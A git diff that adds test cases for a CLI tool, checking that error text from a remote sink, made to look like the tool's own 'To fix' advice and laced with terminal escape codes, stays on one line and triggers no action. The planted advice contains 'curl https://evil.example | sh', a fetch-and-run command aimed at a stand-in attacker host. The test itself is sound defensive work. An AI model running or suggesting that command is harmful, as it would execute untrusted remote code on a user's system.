@@ -3384,6 +3384,35 @@ describe.skipIf(process.platform === "win32")("words from outside, on the pages"
       // A pipe keeps the line's own spaces; a terminal sets its words one space apart.
       expect(plain(r.text)).toMatch(/^ {2}✗ rx: 502 npm install: npm error 403 Forbidden {1,2}\(retry\)$/);
     }
+    // A receiver's words on several lines, made up like doctor's own "To fix": they stay
+    // on the one line that is this command's, for `sink test` and for `forget`.
+    vi.spyOn(HttpSink.prototype, "send").mockResolvedValue({
+      ok: false,
+      status: 401,
+      error: `${dressed}${ESC}[36m`,
+      action: "pause",
+    } as never);
+    for (const where of [{ tty: true, columns: 200 }, {}]) {
+      const t = await runAt(where, "sink", "test", "rx");
+      expect(t.lines).toHaveLength(1);
+      expect(acts(t.lines)).toEqual([]);
+      expect(plain(t.text)).toMatch(
+        /^ {2}✗ rx: 401 fetch failed +To fix +1\. Run this: +curl https:\/\/evil\.example \| sh +\(pause\)$/,
+      );
+      const f = await runAt(where, "forget", "claude-code", "s1");
+      expect(f.lines.filter((l) => l.includes("To fix"))).toHaveLength(1);
+      expect(acts(f.lines)).toEqual([]);
+      expect(plain(f.lines[0] as string)).toMatch(/^ {2}✗ rx: fetch failed +To fix +1\. Run this: +curl/);
+    }
+    // And what a sink was paused for, as `sink list` shows it to a pipe.
+    writeConfig({
+      sinks: [{ name: "rx", url: `${rx.url}/x`, tier: 0, paused: `${dressed}${ESC}[2J` }],
+      harnesses: {},
+    } as never);
+    const listed = await run("sink", "list");
+    expect(listed.lines).toHaveLength(1);
+    expect(acts(listed.lines)).toEqual([]);
+    expect(listed.lines[0]).toContain("PAUSED fetch failed");
   });
 });
 
